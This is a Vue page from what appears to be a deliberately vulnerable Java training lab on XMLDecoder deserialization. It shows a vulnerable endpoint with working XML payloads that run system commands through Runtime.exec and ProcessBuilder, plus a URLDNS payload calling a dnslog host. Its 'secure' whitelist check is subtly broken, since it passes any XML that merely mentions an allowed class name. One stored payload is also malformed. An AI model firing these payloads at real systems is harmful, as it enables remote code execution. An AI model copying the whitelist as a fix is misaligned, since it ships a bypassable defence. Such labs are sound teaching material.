<template>
    <div class="root-div">
        <div class="vuln-info">
            <div class="header-div">组件漏洞 -- XMLDecoder反序列化漏洞</div>
            <div class="body-div">
                <el-tabs v-model="activeName" @tab-click="handleClick">
                    <el-tab-pane label="漏洞描述" name="first">
                        <div class="vuln-detail">
                            XMLDecoder反序列化漏洞是指由于使用不安全的XMLDecoder进行XML数据反序列化，导致攻击者可以通过构造恶意XML数据触发反序列化漏洞，从而在目标系统上执行任意代码。<br/><br/>
                            <span style="color: red;">值得注意的是，与传统的软件缺陷不同，XMLDecoder 反序列化漏洞不是某个特定 JDK 版本引入或修复的。相反，它存在于所有包含 java.beans.XMLDecoder 类的 JDK 版本中，从 Java 1.4 至今。</span><br />
                            <br/>
                            漏洞原理：<br/>
                            1. XMLDecoder默认允许反序列化任意Java类<br/>
                            2. 攻击者可以通过XML标签语法指定任意类进行实例化<br/>
                            3. 利用Runtime、ProcessBuilder等危险类执行系统命令<br/>
                            4. 通过JNDI注入、URLClassLoader等方式实现远程代码执行<br/>
                            <br/>
                            常见原因：<br/>
                            1. 直接使用XMLDecoder反序列化不可信的XML数据<br/>
                            2. 未对输入数据进行严格的类型验证和过滤<br/>
                            3. 未配置类白名单，允许危险类的加载<br/>
                            4. 未升级到安全版本或使用安全的替代方案<br/>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="漏洞危害" name="second">
                        <div class="vuln-detail">
                            1. 远程代码执行（RCE）：攻击者可以在目标系统上执行任意命令<br/>
                            2. 文件系统操作：可以读取、写入、删除系统文件<br/>
                            3. 网络连接：可以建立网络连接，进行数据外泄或反向连接<br/>
                            4. 系统信息泄露：可以获取系统配置、环境变量等敏感信息<br/>
                            5. 权限提升：可能获取更高权限，完全控制目标系统<br/>
                            6. 横向移动：在内部网络中进一步扩散攻击<br/>
                            7. 数据泄露：可能导致数据库密码、API密钥等敏感数据泄露<br/>
                            8. 拒绝服务：通过恶意代码消耗系统资源，导致服务不可用<br/>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="安全编码" name="third">
                        <div class="vuln-detail">
                            【必须】避免使用XMLDecoder处理不可信数据<br/>
                            生产环境中应避免使用XMLDecoder反序列化不可信的XML数据，考虑使用更安全的替代方案。<br/>
                            <br/>
                            【必须】实施类白名单验证<br/>
                            如果必须使用XMLDecoder，应实施严格的类白名单验证，只允许反序列化可信任的类。<br/>
                            <br/>
                            【必须】对输入数据进行严格验证<br/>
                            对XML输入数据进行格式验证、类型检查，确保只处理预期的数据结构。<br/>
                            <br/>
                            【建议】使用安全的XML解析方式<br/>
                            考虑使用其他更安全的XML解析库，如JAXB、DOM4J等，或实现自定义的安全解析逻辑。<br/>
                            <br/>
                            【建议】升级到安全版本<br/>
                            确保使用最新版本的Java和相关库，及时修复已知的安全漏洞。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="参考文章" name="fourth">
                        <div class="vuln-detail">
                            <b>相关技术文档和参考资源：</b>
                            <br/><br/>
                            <b>官方文档：</b>
                            <ul>
                                <li><a href="https://docs.oracle.com/javase/8/docs/api/java/beans/XMLDecoder.html" target="_blank" style="text-decoration: underline;">XMLDecoder官方文档</a></li>
                                <li><a href="https://docs.oracle.com/javase/8/docs/api/java/beans/XMLEncoder.html" target="_blank" style="text-decoration: underline;">XMLEncoder官方文档</a></li>
                            </ul>
                            <br/>
                            <b>安全最佳实践：</b>
                            <ul>
                                <li><a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" target="_blank" style="text-decoration: underline;">OWASP A08:2021 - 软件和数据完整性故障</a></li>
                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" target="_blank" style="text-decoration: underline;">OWASP反序列化安全检查清单</a></li>
                            </ul>
                            <br/>
                            <b>漏洞分析文章：</b>
                            <ul>
                                <li><a href="https://blog.csdn.net/qq_45521281/article/details/106647490" target="_blank" style="text-decoration: underline;">XMLDecoder反序列化漏洞分析</a></li>
                                <li><a href="https://www.veracode.com/blog/secure-development/deserialization-vulnerabilities" target="_blank" style="text-decoration: underline;">反序列化漏洞安全分析</a></li>
                            </ul>
                            <br/>
                            <b>工具和检测：</b>
                            <ul>
                                <li><a href="https://github.com/frohoff/ysoserial" target="_blank" style="text-decoration: underline;">ysoserial - 反序列化漏洞利用工具</a></li>
                                <li><a href="https://github.com/OWASP/CheatSheetSeries" target="_blank" style="text-decoration: underline;">OWASP安全配置检查清单</a></li>
                            </ul>
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </div>
        <div class="code-demo">
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">XMLEncoder序列化和XMLDecoder反序列化介绍<div>
                                <el-button type="primary" round size="mini"
                                    @click="fetchDataAndFillTable1">去测试</el-button>
                            </div></el-row>
                                                 <pre v-highlightjs><code class="java">// XMLEncoder序列化和XMLDecoder反序列化介绍
// 1. XMLEncoder序列化Person对象为XML
Person person = new Person();
person.setName("张三");
person.setAge(25);
String xml = serializeToXML(person);

// 2. XMLDecoder反序列化XML为Person对象
Object result = deserializeFromXML(xml);

// 后端代码 - 支持序列化和反序列化
@PostMapping("/basictest")
public Result xmlEncoderTest(@RequestBody String xmlData) {
    try {
        if (xmlData == null || xmlData.trim().isEmpty()) {
            // 序列化演示：创建Person对象并序列化为XML
            Person person = new Person();
            person.setName("张三");
            person.setAge(25);
            String xmlResult = serializeToXML(person);
            return Result.success("XMLEncoder序列化Person对象成功: " + xmlResult);
        } else {
            // 反序列化演示：将XML数据反序列化为Person对象
            Object result = deserializeFromXML(xmlData);
            return Result.success("XMLDecoder反序列化成功: " + result.toString());
        }
    } catch (Exception e) {
        return Result.error("操作异常: " + e.getMessage());
    }
}

// 序列化方法
private String serializeToXML(Object obj) throws IOException {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    XMLEncoder encoder = new XMLEncoder(baos);
    encoder.writeObject(obj);
    encoder.flush();
    return baos.toString("UTF-8");
}

// 反序列化方法
private Object deserializeFromXML(String xmlStr) throws IOException {
    ByteArrayInputStream bais = new ByteArrayInputStream(xmlStr.getBytes("UTF-8"));
    XMLDecoder decoder = new XMLDecoder(bais);
    return decoder.readObject();
}
</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">XMLDecoder反序列化恶意对象-执行危险命令<div>
                                <el-button type="danger" round size="mini"
                                    @click="fetchDataAndFillTable2">去测试</el-button>
                            </div></el-row>
                                                 <pre v-highlightjs><code class="java">// XMLDecoder反序列化恶意对象-执行危险命令
// 恶意XML payload示例：

// 1. 使用Runtime.exec执行系统命令
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java&gt;
  &lt;object class="java.lang.Runtime" method="getRuntime"&gt;
    &lt;void method="exec"&gt;
      &lt;string&gt;open -a Calculator&lt;/string&gt;
    &lt;/void&gt;
  &lt;/object&gt;
&lt;/java&gt;

// 2. 使用ProcessBuilder执行系统命令
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java&gt;
  &lt;object class="java.lang.ProcessBuilder"&gt;
    &lt;array class="java.lang.String" length="3"&gt;
      &lt;void index="0"&gt;
        &lt;string&gt;open&lt;/string&gt;
      &lt;/void&gt;
      &lt;void index="1"&gt;
        &lt;string&gt;-a&lt;/string&gt;
      &lt;/void&gt;
      &lt;void index="2"&gt;
        &lt;string&gt;Calculator&lt;/string&gt;
      &lt;/void&gt;
    &lt;/array&gt;
    &lt;void method="start"/&gt;
  &lt;/object&gt;
&lt;/java&gt;

// 3. URLDNS攻击 - 利用java.net.URL进行DNS查询
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;java&gt;
  &lt;object class="java.net.URL"&gt;
    &lt;string&gt;http://attacker.dnslog.cn&lt;/string&gt;
  &lt;/object&gt;
&lt;/java&gt;

// 后端漏洞代码
@PostMapping("/vuln1")
public Result xmlDecoderVuln1(@RequestBody String xmlData) {
    try {
        Object result = deserializeFromXML(xmlData);
        return Result.success("恶意对象反序列化成功: " + result.toString());
    } catch (Exception e) {
        return Result.error("反序列化异常: " + e.getMessage());
    }
}
</code></pre>
                    </div>
                </el-col>
            </el-row>
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 使用白名单验证<div>
                                <el-button type="success" round size="mini"
                                    @click="fetchDataAndFillTable3">去测试</el-button>
                            </div></el-row>
                            <pre v-highlightjs><code class="java">// 安全代码 - 使用白名单验证
// 检查是否在白名单中
private boolean isAllowedClass(String xmlData) {
    String[] allowedClasses = {
        "icu.secnotes.pojo.Person",
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.lang.Double",
        "java.lang.Float",
        "java.lang.Boolean",
        "java.util.ArrayList",
        "java.util.HashMap",
        "java.util.LinkedHashMap"
    };
    
    // 检查XML中是否包含允许的类
    for (String allowedClass : allowedClasses) {
        if (xmlData.contains(allowedClass)) {
            return true;
        }
    }
    return false;
}

// 安全反序列化
@PostMapping("/sec1")
public Result xmlDecoderSec1(@RequestBody String xmlData) {
    try {
        // 检查是否在白名单中
        if (!isAllowedClass(xmlData)) {
            return Result.error("安全策略：检测到非白名单类，拒绝反序列化");
        }
        
        Object result = deserializeFromXML(xmlData);
        return Result.success("安全反序列化成功: " + result.toString());
    } catch (Exception e) {
        return Result.error("反序列化异常: " + e.getMessage());
    }
}
</code></pre>
                    </div>
                </el-col>
            </el-row>
        </div>

        <!-- 打开嵌套表格的对话框1 - 基础功能演示 -->
        <el-dialog title="XMLEncoder序列化和XMLDecoder反序列化介绍" :visible.sync="dialogFormVisible1" class="center-dialog" width="60%">
            <div style="text-align: center; color: blue; font-style: italic; margin-bottom: 20px;">
                展示XMLEncoder序列化和XMLDecoder反序列化的完整流程：先序列化Person对象为XML，再反序列化XML恢复对象
            </div>
            <div style="margin-bottom: 20px;">
                <el-tabs v-model="basicTab" type="card">
                    <el-tab-pane label="序列化操作" name="serialize">
                        <el-form :model="basicForm" :inline="true" class="demo-form-inline">
                            <el-form-item label="姓名" label-width="80px">
                                <el-input v-model="basicForm.name" placeholder="请输入姓名" style="width: 200px;"></el-input>
                            </el-form-item>
                            <br />
                            <el-form-item label="年龄" label-width="80px">
                                <el-input-number v-model="basicForm.age" :min="1" :max="150" style="width: 200px;"></el-input-number>
                            </el-form-item>
                            <br />
                            <el-form-item>
                                <el-button type="primary" @click="serializePerson">序列化并输出XML</el-button>
                            </el-form-item>
                        </el-form>
                        <div v-if="serializeResult" style="margin-top: 15px;">
                            <h4 style="margin: 0 0 10px 0; color: #409EFF;">序列化结果：</h4>
                            <pre style="margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 12px; background-color: #f0f9ff; padding: 10px; border: 1px solid #409EFF; border-radius: 4px;">{{ serializeResult }}</pre>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="反序列化操作" name="deserialize">
                        <el-form class="demo-form-inline">
                            <el-form-item label="XML数据" label-width="80px">
                                <el-input 
                                    type="textarea" 
                                    v-model="normalXmlData" 
                                    :rows="8"
                                    placeholder="请输入Person对象的XML数据"
                                    style="width: 400px;"></el-input>
                            </el-form-item>
                            <el-form-item>
                                <el-button type="success" @click="deserializePerson">反序列化XML</el-button>
                            </el-form-item>
                        </el-form>
                        <div v-if="deserializeResult" style="margin-top: 15px;">
                            <h4 style="margin: 0 0 10px 0; color: #67C23A;">反序列化结果：</h4>
                            <pre style="margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 12px; background-color: #f0f9ff; padding: 10px; border: 1px solid #67C23A; border-radius: 4px;">{{ deserializeResult }}</pre>
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </el-dialog>

        <!-- 打开嵌套表格的对话框2 - 恶意对象测试 -->
        <el-dialog title="XMLDecoder反序列化恶意对象测试" :visible.sync="dialogFormVisible2" class="center-dialog">
            <div style="text-align: left; color: red; font-style: italic;">
                注意：这些payload会执行系统命令或进行网络探测，请谨慎测试！
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="Runtime.exec Payload">
                    <el-input v-model="runtimePayload" type="textarea" :rows="6"></el-input>
                </el-form-item>
                <el-form-item label="ProcessBuilder Payload">
                    <el-input v-model="processBuilderPayload" type="textarea" :rows="8"></el-input>
                </el-form-item>
                <el-form-item label="URLDNS Payload">
                    <el-input v-model="urldnsPayload" type="textarea" :rows="4" placeholder="用于URLDNS攻击的XML payload"></el-input>
                </el-form-item>
                <el-form-item>
                    <el-button type="danger" @click="onSubmitRuntime">Runtime.exec测试</el-button>
                    <el-button type="danger" @click="onSubmitProcessBuilder">ProcessBuilder测试</el-button>
                    <el-button type="warning" @click="onSubmitUrlDns">URLDNS攻击测试</el-button>
                </el-form-item>
            </el-form>
            <div>
                <template>
                    <div v-html="resp_text2"></div>
                </template>
            </div>
        </el-dialog>

        <!-- 打开嵌套表格的对话框3 - 安全代码测试 -->
        <el-dialog title="XMLDecoder安全代码测试" :visible.sync="dialogFormVisible3" class="center-dialog">
            <div style="text-align: left; color: green; font-style: italic;">
                安全代码使用白名单验证，可以有效防止恶意攻击
            </div>
            <el-form class="demo-form-inline">
                <el-form-item label="Person对象XML数据">
                    <el-input v-model="normalXmlData" type="textarea" :rows="6"></el-input>
                </el-form-item>
                <el-form-item label="恶意Runtime Payload">
                    <el-input v-model="runtimePayload" type="textarea" :rows="6"></el-input>
                </el-form-item>
                <el-form-item>
                    <el-button type="primary" @click="onSubmitSecNormal">正常数据测试</el-button>
                    <el-button type="danger" @click="onSubmitSecMalicious">恶意数据测试</el-button>
                </el-form-item>
            </el-form>
            <div>
                <template>
                    <div v-html="resp_text3"></div>
                </template>
            </div>
        </el-dialog>
    </div>
</template>

<script>
import { xmlDecoderVuln1, xmlDecoderSec1, xmlEncoderTest, serializePerson } from '@/api/xmldecoder';

export default {
    data() {
        return {
            activeName: 'first',
            dialogFormVisible1: false,
            dialogFormVisible2: false,
            dialogFormVisible3: false,
            
            // 基础序列化/反序列化相关
            basicTab: 'serialize',
            basicForm: {
                name: '张三',
                age: 25
            },
            serializeResult: '',
            deserializeResult: '',
            normalXmlData: '<?xml version="1.0" encoding="UTF-8"?><java><object class="icu.secnotes.pojo.Person"><void property="name"><string>张三</string></void><void property="age"><int>25</int></void></object></java>',
            
            // 恶意对象测试相关
            runtimePayload: '<?xml version="1.0" encoding="UTF-8"?><java><object class="java.lang.Runtime" method="getRuntime"><void method="exec"><string>open -a Calculator</string></void></object></java>',
            processBuilderPayload: '<?xml version="1.0" encoding="UTF-8"?><java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>open</string></void><void index="1"><string>-a</string></void><void index="2"><string>Calculator</string></void></array><void method="start"/></object></java>',
            urldnsPayload: '<?xml version="1.0" encoding="UTF-8"?><object class="java.net.URL"><string>http://35g6eh.dnslog.cn</string><void method="hashCode"/></object></java>',
            resp_text2: '',
            resp_text3: '',
        };
    },
    methods: {
        handleClick(tab, event) {
            // 标签页切换处理
        },
        fetchDataAndFillTable1() {
            this.dialogFormVisible1 = true;
            this.serializeResult = '';
            this.deserializeResult = '';
        },
        fetchDataAndFillTable2() {
            this.dialogFormVisible2 = true;
            this.resp_text2 = '';
        },
        fetchDataAndFillTable3() {
            this.dialogFormVisible3 = true;
            this.resp_text3 = '';
        },

        serializePerson() {
            if (!this.basicForm.name || !this.basicForm.age) {
                this.$message.error('请填写姓名和年龄');
                return;
            }
            serializePerson(this.basicForm).then(response => {
                this.serializeResult = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.serializeResult = 'Error fetching data: ' + error.message;
            });
        },
        deserializePerson() {
            if (!this.normalXmlData) {
                this.$message.error('XML数据不能为空');
                return;
            }
            xmlEncoderTest(this.normalXmlData).then(response => {
                this.deserializeResult = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.deserializeResult = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitRuntime() {
            if (!this.runtimePayload) {
                this.$message.error('Runtime Payload不能为空');
                return;
            }
            xmlDecoderVuln1(this.runtimePayload).then(response => {
                this.resp_text2 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text2 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitProcessBuilder() {
            if (!this.processBuilderPayload) {
                this.$message.error('ProcessBuilder Payload不能为空');
                return;
            }
            xmlDecoderVuln1(this.processBuilderPayload).then(response => {
                this.resp_text2 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text2 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitUrlDns() {
            if (!this.urldnsPayload) {
                this.$message.error('URLDNS Payload不能为空');
                return;
            }
            xmlDecoderVuln1(this.urldnsPayload).then(response => {
                this.resp_text2 = response.data + "\n\n请检查DNSLog平台是否收到DNS查询请求";
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text2 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitSecNormal() {
            if (!this.normalXmlData) {
                this.$message.error('Person对象XML数据不能为空');
                return;
            }
            xmlDecoderSec1(this.normalXmlData).then(response => {
                this.resp_text3 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text3 = 'Error fetching data: ' + error.message;
            });
        },
        onSubmitSecMalicious() {
            if (!this.runtimePayload) {
                this.$message.error('恶意Payload不能为空');
                return;
            }
            xmlDecoderSec1(this.runtimePayload).then(response => {
                this.resp_text3 = response.data;
            }).catch(error => {
                console.error('Error fetching data:', error);
                this.resp_text3 = '安全策略成功阻止了恶意攻击: ' + error.message;
            });
        },
    }
};
</script>

<style>
.vuln-info {
    border-radius: 10px;
    margin: 10px 20px 20px 20px;
}

.header-div {
    font-size: 24px;
    color: #409EFF;
    font-weight: bold;
    padding: 10px;
    justify-content: center;
    align-items: center;
    border-bottom: 1px solid #ccc;
}

.body-div {
    padding: 10px;
    justify-content: center;
    align-items: center;
    font-family: Arial, sans-serif;
    font-size: 14px;
}

.vuln-detail {
    background-color: #dce9f8;
    padding: 10px;
}

.code-demo {
    margin: 20px;
    border-top: 1px solid #ccc;
    padding-top: 20px;
}

pre code {
    font-size: 12px;
}

.el-row {
    margin-bottom: 20px;
}

.el-row:last-child {
    margin-bottom: 0;
}

.el-col {
    border-radius: 4px;
}

.bg-purple-dark {
    background: #99a9bf;
}

.bg-purple {
    background: #d3dce6;
}

.bg-purple-light {
    background: #e5e9f2;
}

.grid-content {
    border-radius: 4px;
    height: 100%;
    padding: 10px;
}

.grid-flex {
    display: flex;
    align-items: stretch;
}

.row-bg {
    padding: 10px 0;
    background-color: #f9fafc;
}

.center-dialog {
    text-align: center;
    margin: 0 auto;
}

.center-dialog-table {
    text-align: center;
}

/* 确保选项卡居中对齐 */
.center-dialog .el-tabs__header {
    text-align: center;
}

.center-dialog .el-tabs__nav-wrap {
    text-align: center;
}

.center-dialog .el-tabs__nav {
    float: none;
    display: inline-block;
}
</style> 